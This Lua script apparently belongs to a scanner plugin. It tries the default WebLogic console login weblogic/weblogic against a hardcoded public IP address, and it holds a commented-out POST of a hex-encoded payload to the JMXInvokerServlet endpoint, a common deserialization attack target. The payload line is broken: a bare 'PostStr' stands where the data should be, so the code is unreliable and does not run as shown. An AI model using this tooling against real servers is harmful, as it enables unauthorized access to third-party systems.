local curl = agent.require "lcurl"

-- Convert string of a hex form like 'aced' into standard string
--
-- @param str The hex string to be converted
-- @return The standard string that converted from str
function string.fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

-- Convert string into a hex form like 'aced' 
--
-- @param str The String to be converted
-- @return The hex string that converted from str
function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

function string.charPrint(str)
    str:gsub('.', function (c)
        io.write(c)
    end)
end

--POST方式访问页面
function check_pwd(login_url, user, pwd,cookie)
    local response_html = ""
    local visitable = true
   
    --local cookie=" ADMINCONSOLESESSION=3QCWWcfWEmXMrRlUtLGKIVQuotZZWP-4iOKYhtDOqZ2V9gupNkSG!-229738787; path=/console/; HttpOnly"
    --headers = {"Cookie:"..cookie}
    headers = {"Accept: text/*",
               "Cookie: "..cookie,
               }
    PostStr
    PostStr=PostStr:fromhex()
    PostStr:charPrint()
    PostStr=PostStr:tohex()
    print("PostStr=",PostStr)
    --PostStr1="test"
    -- requester = curl.easy()
    -- requester:setopt_useragent("Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6")
    -- requester:setopt_httpheader(headers)
    -- --requester:setopt_cookiefile("")
    -- requester:setopt_followlocation(1) --允许redirection
    -- requester:setopt(curl.OPT_HEADER, true)
    -- requester:setopt(curl.OPT_URL,login_url.."/invoker/JMXInvokerServlet")
    -- requester:setopt(curl.OPT_POST, true)
    -- --requester:setopt(curl.OPT_FOLLOWLOCATION,true) --允许redirection
    -- requester:setopt(curl.OPT_POSTFIELDS,PostStr)
    -- requester:setopt(curl.OPT_WRITEFUNCTION, 
    -- function(s) 
    --     response_html = response_html..s 
    --     return true 
    -- end)
    -- requester:setopt(curl.OPT_TIMEOUT, 3)
    -- local tmp_code, tmp_msg = requester:perform()
    -- if requester:getinfo(curl.INFO_RESPONSE_CODE) == 404 then
    --     print("response_code:404")
    --     visitable = false
    -- end
    -- print(response_html)
end

--GET方式访问页面,需要先取Set-Cookie值
function AccessPage(url,cookie) 
    local response_html=""
    local cookielist={}
    local visitable = true
    local requester = curl.easy()
    headers = {"Accept: text/*",
               "Cookie: "..cookie
               }
    GetStr="?j_username=weblogic&j_password=weblogic&j_character_encoding=UTF-8"
    --requester:setopt(curl.OPT_SSL_VERIFYHOST, 0)
    --requester:setopt(curl.OPT_SSL_VERIFYPEER, 0)
    requester:setopt(curl.OPT_HTTPHEADER,headers)
    requester:setopt_cookiefile("Cookie: "..cookie)
    requester:setopt(curl.OPT_HEADER, true)
    requester:setopt(curl.OPT_FOLLOWLOCATION,true)
    requester:setopt(curl.OPT_URL, url.."/console/login/LoginForm.jsp"..GetStr)
    requester:setopt(curl.OPT_WRITEFUNCTION, function(buffer)
    response_html = response_html..buffer
    end)
    requester:setopt(curl.OPT_TIMEOUT, 3)
    local tmp_code, tmp_msg = requester:perform()
    if requester:getinfo(curl.INFO_RESPONSE_CODE) == 404 then
        visitable = false
    end
    
    cookielist=requester:getinfo(curl.INFO_COOKIELIST)
    if cookielist == nil then
        print("cookielist is nil!")
    end
   
    --print(response_html)
   for key, value in pairs(cookielist) do
        print("Cookie:",key,value)
   end
   
   --i,j=string.find(response_html,"[Set-Cookie: %S]*path=/") 
   --if i == nil  then
    --   return
    --end
    --cookie=string.sub(response_html,i+12,j-7) 
    --print ("Cookie:",cookie)
    return cookie
 
end

function main()
    print("[*]Start test.......")
    username="weblogic"
    password="weblogic"
    local cookielist={}
    url="43.224.208.193:8080"
    url="http://"..url
    cookie="test"
    --cookie=AccessPage(url,cookie)
    check_pwd(url,username,password,cookie)
end

main()
